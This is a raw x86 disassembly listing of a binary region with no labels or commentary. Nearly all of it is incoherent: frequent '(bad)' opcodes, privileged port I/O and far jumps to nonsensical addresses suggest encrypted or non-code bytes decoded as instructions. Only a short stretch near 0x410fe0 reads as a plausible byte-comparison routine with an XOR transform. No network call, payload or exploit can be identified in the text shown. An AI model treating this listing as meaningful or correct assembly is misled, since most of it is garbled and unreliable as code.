  410a1b:	xor    bh,BYTE PTR [eax+ebx*2+0x3b49e1cd]
  410a22:	jl     0x410a47
  410a24:	stc    
  410a25:	jmp    0x4109f2
  410a27:	mov    ecx,0x8c934c5b
  410a2c:	or     ebp,DWORD PTR [eax-0x5b]
  410a2f:	fild   QWORD PTR [ebp-0x71e92590]
  410a35:	clc    
  410a36:	sub    DWORD PTR [esi+0x59],esp
  410a39:	inc    edx
  410a3a:	sar    DWORD PTR [edx+0x3],1
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	jb     0x410a4d
  410a51:	fs (bad) 
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a2a
  410a5c:	pop    es
  410a5d:	push   ss
  410a5e:	cmp    eax,0x444302e2
  410a63:	mov    eax,0xb71b8339
  410a68:	(bad)  
  410a69:	xor    al,0xdd
  410a6b:	mov    dh,0x5e
  410a6d:	lahf   
  410a6e:	and    BYTE PTR [edx+0x61d7a29d],ah
  410a74:	in     eax,dx
  410a75:	out    0x7f,al
  410a77:	jmp    0xa7e885e6
  410a7c:	dec    ecx
  410a7d:	mov    BYTE PTR [ebx],bh
  410a7f:	mov    edx,0x882436f7
  410a84:	and    bh,bh
  410a86:	cmp    DWORD PTR [edi+edx*1-0x6c],0x51
  410a8b:	test   BYTE PTR [ebp+0x38619bf],al
  410a91:	pop    edi
  410a92:	lds    edi,FWORD PTR [eax+ecx*4]
  410a95:	pop    ds
  410a96:	sbb    dh,ah
  410a98:	xchg   ecx,eax
  410a99:	call   0x110a6eb1
  410a9e:	dec    esp
  410a9f:	dec    edx
  410aa0:	daa    
  410aa1:	lahf   
  410aa2:	sbb    edi,DWORD PTR [ecx]
  410aa4:	enter  0x6b83,0xb6
  410aa8:	(bad)  
  410aa9:	dec    edi
  410aaa:	add    ch,BYTE PTR [ecx]
  410aac:	pop    edi
  410aad:	aaa    
  410aae:	out    0x81,al
  410ab0:	pop    ds
  410ab1:	mov    al,0xbc
  410ab3:	mov    ah,0x79
  410ab5:	ret    0x894d
  410ab8:	xor    eax,0xdcc6561
  410abd:	push   eax
  410abe:	sbb    edx,DWORD PTR ds:0x24954d2d
  410ac4:	dec    esp
  410ac5:	and    BYTE PTR [ebx-0x4d],0xfd
  410ac9:	test   DWORD PTR [ebx],0xb6810986
  410acf:	xchg   esp,eax
  410ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ad2:	shl    BYTE PTR [ebp+eax*8+0x4e],cl
  410ad6:	jo     0x410a8e
  410ad8:	cmp    eax,0x61b604f4
  410add:	jg     0x410afb
  410adf:	iret   
  410ae0:	xchg   esi,eax
  410ae1:	fwait
  410ae2:	push   es
  410ae3:	push   ecx
  410ae4:	ins    DWORD PTR es:[edi],dx
  410ae5:	push   es
  410ae6:	mov    eax,0x3173f240
  410aeb:	das    
  410aec:	or     bl,BYTE PTR [edx-0x4ebaf2f1]
  410af2:	not    ecx
  410af4:	test   dl,al
  410af6:	push   0x50545cb4
  410afb:	mov    gs,WORD PTR [edx]
  410afd:	jge    0x410afc
  410aff:	and    eax,0x193b97bc
  410b04:	or     DWORD PTR [eax-0x2c1abd7c],edx
  410b0a:	sbb    eax,0xf0363fdb
  410b0f:	ret    0x487c
  410b12:	or     DWORD PTR ss:[ebx+ecx*1-0xf],esp
  410b17:	or     ebp,DWORD PTR [eax-0x326eb59]
  410b1d:	dec    edx
  410b1e:	lfs    edi,FWORD PTR [eax+0x1b4769b5]
  410b25:	xor    esp,eax
  410b27:	jmp    0x410afc
  410b29:	stos   BYTE PTR es:[edi],al
  410b2a:	jnp    0x410ac9
  410b2c:	or     DWORD PTR [ecx-0x29e2f7f4],0x17
  410b33:	push   edi
  410b34:	ja     0x410b04
  410b36:	icebp  
  410b37:	mov    ah,0x78
  410b39:	cwde   
  410b3a:	inc    ebx
  410b3b:	cmp    edx,edi
  410b3d:	inc    ebp
  410b3e:	and    eax,0x96cf2380
  410b43:	imul   esi,esi,0xa4612f9d
  410b49:	adc    DWORD PTR [ebx],esp
  410b4b:	pop    edx
  410b4c:	pop    ebp
  410b4d:	pop    esi
  410b4e:	(bad)  
  410b4f:	fbld   TBYTE PTR [ebx-0x177ad6e0]
  410b55:	and    eax,0x32924c15
  410b5a:	fisttp DWORD PTR [eax+0x23]
  410b5d:	out    dx,al
  410b5e:	mov    DWORD PTR [edi+0x7b],ebp
  410b61:	inc    ecx
  410b62:	mov    al,0x83
  410b64:	popa   
  410b65:	mov    ch,0x99
  410b67:	add    eax,0x7532c939
  410b6c:	jmp    0x410b1e
  410b6e:	jmp    0xfc559609
  410b73:	mov    ch,BYTE PTR [ebp+0x61]
  410b76:	int    0x16
  410b78:	pop    esi
  410b79:	jo     0x410be8
  410b7b:	pop    eax
  410b7c:	mov    edx,DWORD PTR [edx]
  410b7e:	fmul   QWORD PTR [edi+0x10]
  410b81:	pop    es
  410b82:	jns    0x410b34
  410b84:	mov    DWORD PTR [edi+eax*1+0xa],esp
  410b88:	dec    eax
  410b89:	push   ebx
  410b8a:	ficom  DWORD PTR [ebp-0x222403c8]
  410b90:	rol    edx,cl
  410b92:	push   eax
  410b93:	adc    bl,al
  410b95:	mov    edi,0xe0f831be
  410b9a:	in     al,dx
  410b9b:	cmc    
  410b9c:	mov    ch,0x9e
  410b9e:	jp     0x410b82
  410ba0:	dec    ebp
  410ba1:	cmp    eax,0xee6b5ae8
  410ba6:	push   ss
  410ba7:	stos   BYTE PTR es:[edi],al
  410ba8:	test   DWORD PTR [ebp-0x7],esi
  410bab:	add    bh,0xe
  410bae:	lods   al,BYTE PTR ds:[esi]
  410baf:	sbb    al,0x4b
  410bb1:	push   eax
  410bb2:	adc    eax,0x40580739
  410bb7:	mov    esi,ebx
  410bb9:	xchg   edx,eax
  410bba:	test   al,0x56
  410bbc:	aaa    
  410bbd:	sub    ecx,edx
  410bbf:	pop    DWORD PTR [ecx]
  410bc1:	and    al,0x8c
  410bc3:	jp     0x410bde
  410bc5:	repz cdq 
  410bc7:	sub    ecx,DWORD PTR [edx-0x72d95a50]
  410bcd:	dec    ebp
  410bce:	pop    ss
  410bcf:	daa    
  410bd0:	cwde   
  410bd1:	popf   
  410bd2:	shl    DWORD PTR [ebp+0x32],1
  410bd5:	(bad)  
  410bd6:	jb     0x410ba6
  410bd8:	dec    ecx
  410bd9:	test   al,0x15
  410bdb:	imul   esp,ebx,0xc2727cea
  410be1:	ss pusha 
  410be3:	repz add eax,0xc7f26c75
  410be9:	(bad)  
  410bea:	scas   al,BYTE PTR es:[edi]
  410beb:	repz add bh,BYTE PTR [ecx+0x701d879c]
  410bf2:	in     eax,dx
  410bf3:	addr16 push ecx
  410bf5:	inc    ebp
  410bf6:	fsub   DWORD PTR [esi-0x66ee5071]
  410bfc:	and    BYTE PTR [edi-0x3e],al
  410bff:	mov    ecx,eax
  410c01:	xchg   esp,eax
  410c02:	in     al,0x88
  410c04:	push   esi
  410c05:	js     0x410bee
  410c07:	push   DWORD PTR [eax-0x2e]
  410c0a:	mov    ecx,0x15bf3414
  410c0f:	xlat   BYTE PTR ds:[ebx]
  410c10:	mov    eax,ds:0x676f878
  410c15:	jb     0x410c66
  410c17:	mov    dl,0x75
  410c19:	cmp    ah,BYTE PTR [ecx-0xe]
  410c1c:	repnz and DWORD PTR [eax-0x10],0x327aef12
  410c24:	inc    edx
  410c25:	rcr    BYTE PTR ds:[edi-0x70],1
  410c29:	mov    esi,0x8bfc85f1
  410c2e:	xor    eax,0x48
  410c31:	cmp    BYTE PTR [esi],ch
  410c33:	retf   0xe3ab
  410c36:	adc    BYTE PTR [ebp-0x6144818c],bh
  410c3c:	sbb    eax,edx
  410c3e:	popa   
  410c3f:	stos   BYTE PTR es:[edi],al
  410c40:	push   es
  410c41:	push   ss
  410c42:	rcr    DWORD PTR [edi-0x24],cl
  410c45:	ins    DWORD PTR es:[edi],dx
  410c46:	lods   eax,DWORD PTR ds:[esi]
  410c47:	jno    0x410cb0
  410c49:	adc    eax,0x71f575ef
  410c4e:	int    0x5a
  410c50:	loopne 0x410c2d
  410c52:	and    DWORD PTR [edx+eiz*8-0x5d5b2d94],eax
  410c59:	sbb    esi,ecx
  410c5b:	inc    edi
  410c5c:	ret    0x13a9
  410c5f:	(bad)  
  410c60:	cli    
  410c61:	xchg   esp,eax
  410c62:	or     BYTE PTR [esi],dl
  410c64:	mov    esp,0x67da6a96
  410c69:	daa    
  410c6a:	or     DWORD PTR [di],0xffffffc5
  410c6e:	fwait
  410c6f:	inc    ecx
  410c70:	mov    bh,0x52
  410c72:	pop    ecx
  410c73:	adc    DWORD PTR [ebx+esi*1],ebx
  410c76:	fwait
  410c77:	pop    ebx
  410c78:	call   0x910b0d2a
  410c7d:	xchg   ecx,ebp
  410c7f:	(bad)  
  410c80:	cmp    al,0x26
  410c82:	push   0x49c9f4d1
  410c87:	lahf   
  410c88:	jnp    0x410c6d
  410c8a:	leave  
  410c8b:	adc    eax,0xa4422f5c
  410c90:	hlt    
  410c91:	jo     0x410d0d
  410c93:	sti    
  410c94:	call   0x20af:0xd9e5b512
  410c9b:	xor    ecx,esi
  410c9d:	out    dx,eax
  410c9e:	lods   eax,DWORD PTR ds:[esi]
  410c9f:	mov    ebp,0x99a1180a
  410ca5:	sti    
  410ca6:	adc    edx,edx
  410ca8:	lods   al,BYTE PTR ds:[esi]
  410ca9:	mov    ds:0x6e1d6c23,al
  410cae:	inc    eax
  410caf:	aam    0x35
  410cb1:	sub    al,0x60
  410cb3:	aam    0x9
  410cb5:	mul    BYTE PTR [eax-0x5b]
  410cb8:	js     0x410c52
  410cba:	pop    ds
  410cbb:	jp     0x410d25
  410cbd:	addr16 jbe 0x410cb8
  410cc0:	mov    dh,0x8d
  410cc2:	sub    DWORD PTR [edi-0x3a],esi
  410cc5:	mov    al,0xca
  410cc7:	gs push ebp
  410cc9:	out    0x36,al
  410ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ccc:	jae    0x410c95
  410cce:	dec    edi
  410ccf:	jle    0x410cd2
  410cd1:	push   eax
  410cd2:	popf   
  410cd3:	gs jo  0x410cd6
  410cd6:	cmp    DWORD PTR [ebp+0x6243b98f],edi
  410cdc:	aas    
  410cdd:	imul   esp,DWORD PTR [edx-0x48e91fed],0xfa3a6f7b
  410ce7:	(bad)
  410cea:	xchg   edi,eax
  410ceb:	sbb    edi,ebx
  410ced:	mov    ebp,0x40aca970
  410cf2:	aas    
  410cf3:	push   ebp
  410cf4:	(bad)  
  410cf5:	cli    
  410cf6:	loop   0x410d0f
  410cf8:	jle    0x410d4b
  410cfa:	and    DWORD PTR [ebp+0xf],0x4d738828
  410d01:	nop
  410d02:	es push ds
  410d04:	shl    DWORD PTR [eax],cl
  410d06:	push   0x54
  410d08:	leave  
  410d09:	push   0x5e
  410d0b:	inc    esp
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xfc33a69c
  410d25:	loopne 0x410d12
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	dec    esi
  410d2f:	mov    ?,WORD PTR [ecx-0x1d]
  410d32:	jmp    0x5488:0x9e9e7a59
  410d39:	mov    edx,0xf56bc10b
  410d3e:	outs   dx,BYTE PTR ds:[esi]
  410d3f:	mov    edi,0x7890d3bd
  410d44:	xchg   DWORD PTR [ebp-0x76],esi
  410d47:	and    al,0xb0
  410d49:	jns    0x410d1b
  410d4b:	call   0x5fea49a9
  410d50:	mov    dh,0xc4
  410d52:	mov    edi,0xddb830e6
  410d57:	cmp    al,0x78
  410d59:	or     DWORD PTR [ebx+0x58],0x810b6f82
  410d60:	in     eax,dx
  410d61:	jp     0x410d8c
  410d63:	pushf  
  410d64:	jle    0x410d45
  410d66:	push   eax
  410d67:	(bad)  
  410d68:	sub    eax,0x2e7ee49b
  410d6d:	leave  
  410d6e:	or     esp,DWORD PTR [ebp+0x785acb25]
  410d74:	test   eax,0x9ebc6985
  410d79:	push   cs
  410d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d7b:	xor    esi,DWORD PTR [edx-0xad7d96c]
  410d81:	daa    
  410d82:	sub    eax,0xb1f6e20c
  410d87:	jns    0x410d41
  410d89:	jmp    0x410d7a
  410d8b:	sub    ah,BYTE PTR [ecx]
  410d8d:	popf   
  410d8e:	mov    edx,0x89432508
  410d93:	sub    ah,dh
  410d95:	pusha  
  410d96:	das    
  410d97:	xor    edx,DWORD PTR gs:[ebp-0x147d2128]
  410d9e:	ins    DWORD PTR es:[edi],dx
  410d9f:	adc    DWORD PTR [ecx-0x7dffda6d],eax
  410da5:	jae    0x410dee
  410da7:	xchg   ebx,eax
  410da8:	in     eax,0xa0
  410daa:	outs   dx,BYTE PTR ds:[esi]
  410dac:	ficom  WORD PTR [edi-0x675b9449]
  410db2:	inc    edi
  410db3:	(bad)  
  410db4:	mov    esp,0x2d78640
  410db9:	dec    ebp
  410dba:	sbb    BYTE PTR [ebp-0x7c3cd209],0xfc
  410dc1:	jmp    0x1e32:0x881e69cf
  410dc8:	scas   al,BYTE PTR es:[edi]
  410dc9:	adc    esp,DWORD PTR [edi]
  410dcb:	xchg   ecx,eax
  410dcc:	cmc    
  410dcd:	iret   
  410dce:	shr    DWORD PTR [edi+0x4],cl
  410dd1:	sub    ebp,DWORD PTR [esi-0x1564c5a5]
  410dd7:	loopne 0x410d7c
  410dd9:	lods   al,BYTE PTR ds:[esi]
  410dda:	sbb    bx,WORD PTR [edi]
  410ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dde:	enter  0x738c,0x17
  410de2:	and    DWORD PTR ds:[ecx-0xf8ceea0],0xf97a0541
  410ded:	dec    edx
  410dee:	sub    ebp,edi
  410df0:	inc    eax
  410df1:	jnp    0x410dc8
  410df3:	call   0x43e5a765
  410df8:	mov    ?,esp
  410dfa:	jge    0x410e68
  410dfc:	mov    al,0x97
  410dfe:	and    eax,DWORD PTR [ebx]
  410e00:	fs aad 0x44
  410e03:	inc    eax
  410e04:	push   es
  410e05:	mov    dh,0xf8
  410e07:	(bad)  
  410e08:	std    
  410e09:	jecxz  0x410e3c
  410e0b:	pop    edx
  410e0c:	cdq    
  410e0d:	(bad)  
  410e0e:	cwde   
  410e0f:	jno    0x410dca
  410e11:	mov    al,0x31
  410e13:	xchg   ebp,eax
  410e14:	sbb    ebp,DWORD PTR [ebp+0x5c]
  410e17:	pop    ds
  410e18:	jnp    0x410e2c
  410e1a:	fwait
  410e1b:	xor    edx,DWORD PTR ds:0xd85009f5
  410e21:	cmc    
  410e22:	pop    ss
  410e23:	retf   
  410e24:	out    0xfd,eax
  410e26:	push   0x61
  410e28:	cs test ecx,ebp
  410e2b:	inc    esi
  410e2c:	inc    eax
  410e2d:	test   DWORD PTR [edx+0x11],edx
  410e30:	imul   ecx,ecx,0xffffffa9
  410e33:	cs ds mov edx,0x7f739e46
  410e3a:	mov    ds:0x81d1f829,al
  410e3f:	mov    ds:0xe3513faf,eax
  410e44:	out    0x6a,al
  410e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e47:	push   esi
  410e48:	dec    ebp
  410e49:	jne    0x410e15
  410e4b:	mov    dl,0xef
  410e4d:	ret    
  410e4e:	inc    esp
  410e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e50:	ins    BYTE PTR es:[edi],dx
  410e51:	sahf   
  410e52:	cmc    
  410e53:	add    eax,DWORD PTR [edi-0x4]
  410e56:	rcl    edx,1
  410e58:	scas   al,BYTE PTR es:[edi]
  410e59:	(bad)  
  410e5a:	popa   
  410e5b:	scas   eax,DWORD PTR es:[edi]
  410e5c:	xchg   ecx,eax
  410e5d:	loopne 0x410e86
  410e5f:	and    BYTE PTR ss:[esi+0x72],dl
  410e63:	dec    ebp
  410e64:	loopne 0x410e3f
  410e66:	imul   ecx,DWORD PTR [edx+0x4d],0xc92c88dd
  410e6d:	imul   edx,DWORD PTR [ebx+0xc],0xdb8f361c
  410e74:	and    al,0x22
  410e76:	aas    
  410e77:	dec    eax
  410e78:	popf   
  410e79:	mov    ch,0x9e
  410e7b:	mov    bl,BYTE PTR [edx+ebp*1]
  410e7e:	arpl   WORD PTR [edi],bp
  410e80:	mov    ah,0x32
  410e82:	test   bh,al
  410e84:	push   es
  410e85:	adc    ecx,edx
  410e87:	ret    0x5e64
  410e8a:	cli    
  410e8b:	xchg   BYTE PTR [ebx],ah
  410e8d:	mov    al,BYTE PTR [eax+0x5938d69f]
  410e93:	ror    BYTE PTR [edx],0xe9
  410e96:	out    dx,al
  410e97:	jecxz  0x410e46
  410e99:	jp     0x410ea4
  410e9b:	jecxz  0x410ece
  410e9d:	cmp    al,0xc5
  410e9f:	shr    DWORD PTR [esi-0x3b09ecfc],0xd0
  410ea6:	pop    ds
  410ea7:	mov    ss,WORD PTR [edx]
  410ea9:	pusha  
  410eaa:	dec    eax
  410eab:	mov    esi,0xb0734a6d
  410eb0:	fnstenv cs:[ecx+0x57]
  410eb4:	in     al,dx
  410eb5:	enter  0x72c,0x92
  410eb9:	pop    eax
  410eba:	(bad)  
  410ebe:	cs mov bh,0x47
  410ec1:	adc    dl,dh
  410ec3:	inc    ebp
  410ec4:	test   DWORD PTR [eax-0x7d388173],edi
  410eca:	nop
  410ecb:	mov    esi,0xe3750829
  410ed0:	inc    edx
  410ed1:	jp     0x410e62
  410ed3:	sbb    eax,DWORD PTR [edi]
  410ed5:	icebp  
  410ed6:	jno    0x410ec1
  410ed8:	les    esp,FWORD PTR [ebx]
  410eda:	clc    
  410edb:	adc    eax,DWORD PTR [eax-0x5d]
  410ede:	xchg   ebp,eax
  410edf:	call   0x50356fc0
  410ee4:	(bad)  
  410ee5:	mov    ds:0xcdcccf62,eax
  410eea:	scas   al,BYTE PTR es:[edi]
  410eeb:	pop    esi
  410eec:	pop    ds
  410eed:	test   ebx,ebp
  410eef:	rcr    BYTE PTR [edi],0x4d
  410ef2:	sub    bl,BYTE PTR [edi]
  410ef4:	mov    ah,0x26
  410ef6:	inc    edx
  410ef7:	pop    eax
  410ef8:	and    eax,0x9e08fe5b
  410efd:	push   edi
  410efe:	xlat   BYTE PTR ds:[ebx]
  410eff:	xchg   BYTE PTR [ebp+0x59e60c54],al
  410f05:	call   0x82153f5e
  410f0a:	fisttp QWORD PTR [eax+0x5d]
  410f0d:	aas    
  410f0e:	jae    0x410f2e
  410f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f11:	ins    DWORD PTR es:[edi],dx
  410f12:	stc    
  410f13:	adc    DWORD PTR [esi+0x75c28a41],0x2560d2b9
  410f1d:	push   cs
  410f1e:	out    dx,eax
  410f1f:	and    edi,DWORD PTR [edx+0x33]
  410f22:	xor    BYTE PTR [ebp+ebp*2-0x3c4b57f],0xf5
  410f2a:	sbb    BYTE PTR ds:0x10cab360,ah
  410f30:	arpl   WORD PTR [ecx+0x28],bp
  410f33:	add    al,0xc5
  410f35:	nop
  410f36:	xor    eax,0x20e5afe3
  410f3b:	push   ss
  410f3c:	mov    esp,0x71fa604
  410f41:	pop    es
  410f42:	popf   
  410f43:	leave  
  410f44:	or     DWORD PTR [ecx-0x57],edi
  410f47:	cmp    al,0x1e
  410f49:	cld    
  410f4a:	inc    ecx
  410f4b:	ins    BYTE PTR es:[edi],dx
  410f4c:	xor    al,BYTE PTR [ebx-0x54]
  410f4f:	mov    edx,0x24fb9
  410f54:	inc    ebp
  410f55:	push   es
  410f56:	daa    
  410f57:	xchg   esp,eax
  410f58:	lahf   
  410f59:	inc    ebx
  410f5a:	adc    ebp,ecx
  410f5c:	clc    
  410f5d:	or     eax,0x35e970ef
  410f62:	sbb    ebp,0xdb760760
  410f68:	je     0x410f15
  410f6a:	call   0xeb31:0xdf0b003d
  410f71:	daa    
  410f72:	iret   
  410f73:	cmp    eax,0xee9f7a1c
  410f78:	mov    bh,0x41
  410f7a:	imul   ecx,edx,0xc8c8e1ee
  410f80:	inc    eax
  410f81:	push   ebp
  410f82:	ret    
  410f83:	and    eax,0x72462002
  410f88:	xchg   ecx,eax
  410f89:	lahf   
  410f8a:	loopne 0x410fa2
  410f8c:	xor    al,0x24
  410f8e:	push   esp
  410f8f:	xor    BYTE PTR [edx],0x69
  410f92:	cmp    al,0x19
  410f94:	xchg   esi,eax
  410f95:	push   eax
  410f96:	out    dx,eax
  410f97:	jnp    0x410fe8
  410f99:	int3   
  410f9a:	pop    ss
  410f9b:	push   0x5405b713
  410fa0:	shl    BYTE PTR ss:[edx],1
  410fa3:	ins    DWORD PTR es:[edi],dx
  410fa4:	ret    0x3605
  410fa7:	jo     0x410f3c
  410fa9:	cmovae ebp,DWORD PTR [ecx-0x2d47f4c3]
  410fb0:	pop    edx
  410fb1:	aaa    
  410fb2:	aam    0x3d
  410fb4:	push   ebx
  410fb5:	mov    cl,BYTE PTR [eax]
  410fb7:	sbb    bh,ah
  410fb9:	mov    ecx,0x36c7825f
  410fbe:	pop    ss
  410fbf:	cs or  eax,0xc0da863e
  410fc5:	call   FWORD PTR [edi+0x64]
  410fc8:	out    dx,eax
  410fc9:	xor    ecx,edx
  410fcb:	sbb    eax,0x4d513e14
  410fd0:	or     ecx,DWORD PTR ds:0xde24c2aa
  410fd6:	addr16 mov dl,0x32
  410fd9:	out    0xa9,al
  410fdb:	xor    DWORD PTR [edx],ebp
  410fdd:	jle    0x411054
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411088
  41102b:	mov    bh,0x22
  41102d:	loope  0x411047
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x410ff6
  411037:	or     al,0xa6
  411039:	scas   al,BYTE PTR es:[edi]
  41103a:	std    
  41103b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41103c:	jmp    0xbc08:0x899b142
  411043:	jl     0x411022
  411045:	mov    edi,0x8038f5ae
  41104a:	jmp    0x1b787225
  41104f:	xchg   ebx,eax
  411050:	ins    DWORD PTR es:[edi],dx
  411051:	add    al,0x8
  411053:	jge    0x411030
  411055:	xchg   ecx,eax
  411056:	mov    bl,0x31
  411058:	es xchg ebp,eax
  41105a:	icebp  
  41105b:	jbe    0x41106e
  41105d:	pop    edi
  41105e:	fdiv   QWORD PTR [esi+0x6e6309a]
  411064:	fwait
  411065:	inc    esp
  411066:	pop    ds
  411067:	pop    edx
  411068:	cmp    al,0xb2
  41106a:	mov    al,ds:0xcdd9cad3
  41106f:	mov    ds:0xd100e8d0,al
  411074:	sub    dh,BYTE PTR [ebp+0x4dc231f0]
  41107a:	sub    al,0xdc
  41107c:	mov    ebp,0xf54ec2a
  411081:	iret   
  411082:	xor    bh,ch
  411084:	jmp    0x72d9d828
  411089:	cmp    DWORD PTR [ecx],0x7a
  41108c:	jg     0x411032
  41108e:	xchg   DWORD PTR [ebx+edx*4+0x21708e10],eax
  411095:	or     al,0x34
  411097:	daa    
  411098:	jmp    0x411057
  41109a:	sbb    bl,BYTE PTR [ebx+0x33d764ef]
  4110a0:	xchg   edi,ebx
  4110a2:	int    0xb1
  4110a4:	mov    ds:0xa4391558,eax
  4110a9:	jne    0x4110ee
  4110ab:	(bad)  
  4110ac:	fld    st(0)
  4110ae:	ins    BYTE PTR es:[edi],dx
  4110af:	repz dec ebp
  4110b1:	je     0x411106
  4110b3:	pop    ss
  4110b4:	pop    esi
  4110b5:	in     eax,0xd
  4110b7:	popa   
  4110b8:	dec    ebp
  4110b9:	fst    QWORD PTR [edx-0x788638c1]
  4110bf:	and    DWORD PTR [ebp+esi*8-0x42c21b4f],edx
  4110c6:	test   al,0x48
  4110c8:	paddsw mm5,QWORD PTR [edx-0x72]
  4110cc:	sbb    esi,edi
  4110ce:	(bad)  
  4110cf:	sub    al,0xa3
  4110d1:	hlt    
  4110d2:	in     eax,dx
  4110d3:	mov    WORD PTR [esi-0x47b055e0],gs
  4110d9:	test   al,0xc5
  4110db:	lock call 0x99ec209a
  4110e1:	dec    edx
  4110e2:	lock mov DWORD PTR [edi],ebp
  4110e5:	fist   DWORD PTR [ebp+0x25]
  4110e8:	sbb    DWORD PTR [edi+0x1b],esp
  4110eb:	stos   DWORD PTR es:[edi],eax
  4110ec:	mov    edx,0x3751a647
  4110f1:	pop    eax
  4110f2:	pop    ecx
  4110f3:	outs   dx,DWORD PTR ds:[esi]
  4110f4:	xchg   edx,eax
  4110f5:	call   0x8d6f:0x6635d6a1
  4110fc:	fidiv  WORD PTR [ebp-0x5a]
  4110ff:	test   DWORD PTR [edx-0x5b],ebx
  411102:	loopne 0x411143
  411104:	mov    ah,0x43
  411106:	xchg   ecx,eax
  411107:	repz loopne 0x411105
  41110a:	test   eax,0xb0c235f1
  41110f:	test   DWORD PTR [edx],0xb9e716c7
  411115:	inc    esi
  411116:	xlat   BYTE PTR ds:[ebx]
  411117:	xchg   ebp,eax
  411118:	ins    BYTE PTR es:[edi],dx
  411119:	sbb    edi,DWORD PTR [eax+0x6f1fa97a]
  41111f:	sbb    bl,BYTE PTR [esi-0x3e]
  411122:	aas    
  411123:	pop    esi
  411124:	ret    0x65e5
  411127:	or     dh,dh
  411129:	dec    esi
  41112a:	pop    es
  41112b:	jae    0x411156
  41112d:	pop    ecx
  41112e:	sub    BYTE PTR [edi-0x675928da],cl
  411134:	stos   BYTE PTR es:[edi],al
  411135:	pop    edx
  411136:	inc    ecx
  411137:	inc    ebp
  411138:	test   al,0xc2
  41113a:	fwait
  41113b:	xor    BYTE PTR [esi-0x48],cl
  41113e:	xlat   BYTE PTR ds:[ebx]
  41113f:	push   0xffffff86
  411141:	retf   0x1c2d
  411144:	enter  0xc646,0xa6
  411148:	push   edx
  411149:	fmul   st,st(7)
  41114b:	xor    al,0x60
  41114d:	lods   al,BYTE PTR ds:[esi]
  41114e:	sub    dl,ah
  411150:	push   ebx
  411151:	(bad)  [edi+0x2d8af07d]
  411157:	push   0xffffff90
  411159:	frstor [ebx]
  41115b:	mov    ecx,0xa880ee3c
  411160:	adc    al,0xff
  411162:	push   ebx
  411163:	push   0xffffff98
  411165:	add    al,0xfe
  411167:	lds    edx,FWORD PTR [ecx]
  411169:	aam    0x9d
  41116b:	retf   0x10ca
  41116e:	sub    eax,0xd73f1e55
  411173:	mov    ds:0xe2b633b7,al
  411178:	sub    al,0x8a
  41117a:	mov    BYTE PTR [ecx+0x515662e],dl
  411180:	mov    ds:0x257faee0,al
  411185:	mov    al,BYTE PTR [edx+0x650da7a7]
  41118b:	out    dx,al
  41118c:	inc    ebx
  41118d:	dec    ecx
  41118e:	retf   
  41118f:	mov    bh,0x7c
  411191:	and    eax,0x86db549b
  411196:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411199:	fs mov edi,0xeb25a2f1
  41119f:	data16 fimul WORD PTR [edx]
  4111a2:	call   0xede5:0x30de27e3
  4111a9:	in     eax,dx
  4111aa:	inc    ecx
  4111ab:	mov    dl,0x97
  4111ad:	inc    eax
  4111ae:	out    dx,eax
  4111af:	sub    BYTE PTR [edi-0x49],al
  4111b2:	retf   
  4111b3:	jo     0x41113d
  4111b5:	adc    esi,DWORD PTR [ecx+0x49]
  4111b8:	inc    ebx
  4111b9:	rcr    DWORD PTR [esp+eax*8-0x841947d],0xf8
  4111c1:	lock xchg ebx,eax
  4111c3:	out    0x84,eax
  4111c5:	jg     0x411187
  4111c7:	bnd je 0x411242
  4111ca:	cs pop edx
  4111cc:	dec    edi
  4111cd:	mov    ah,0x45
  4111cf:	retf   
  4111d0:	jnp    0x41119e
  4111d2:	mov    bl,0x96
  4111d4:	inc    edx
  4111d5:	dec    edx
  4111d6:	cmp    BYTE PTR [edi-0x62],bh
  4111d9:	mov    eax,ds:0xf27d9119
  4111de:	(bad)  
  4111df:	adc    ebx,edx
  4111e1:	pop    edi
  4111e2:	sahf   
  4111e3:	cmp    dh,cl
  4111e5:	dec    ebx
  4111e6:	mov    esp,0x8e22f826
  4111eb:	push   ds
